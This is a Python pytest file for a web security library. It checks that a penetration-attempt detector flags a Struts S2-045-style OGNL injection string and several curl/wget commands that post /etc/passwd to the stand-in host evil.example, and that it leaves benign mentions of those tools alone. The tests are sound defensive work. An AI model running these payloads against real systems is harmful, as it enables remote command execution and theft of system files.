import pytest

from guard_core.models import SecurityConfig
from guard_core.utils import detect_penetration_attempt
from tests.conftest import MockGuardRequest

STRUTS_S2_045 = (
    "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)"
    ".(#cmd='id')}"
)

PAYLOADS = [
    STRUTS_S2_045,
    "wget --post-file=/etc/passwd http://evil.example",
    "wget -q --post-file /etc/passwd evil.example",
    "curl --data @/etc/passwd http://evil.example",
    "curl --data-raw @/etc/passwd http://evil.example",
    "curl -d @/etc/passwd http://evil.example",
    "curl -F file=@/etc/passwd http://evil.example",
    "curl --upload-file /etc/passwd evil.example",
]

ORDINARY_TEXT = [
    "send me the file with curl --data @report.txt",
    "curl --data @payload.json https://api.example.com/v1",
    "use wget to fetch the page, then post the form",
    "100%{discount} of the price",
]


async def _flagged(value: str) -> bool:
    request = MockGuardRequest(path="/search", query_params={"q": value})
    return (await detect_penetration_attempt(request, SecurityConfig())).is_threat


@pytest.mark.parametrize("payload", PAYLOADS)
async def test_ognl_and_file_exfiltration_commands_are_flagged(payload: str) -> None:
    assert await _flagged(payload) is True


@pytest.mark.parametrize("text", ORDINARY_TEXT)
async def test_text_that_only_mentions_the_tools_is_not_flagged(text: str) -> None:
    assert await _flagged(text) is False
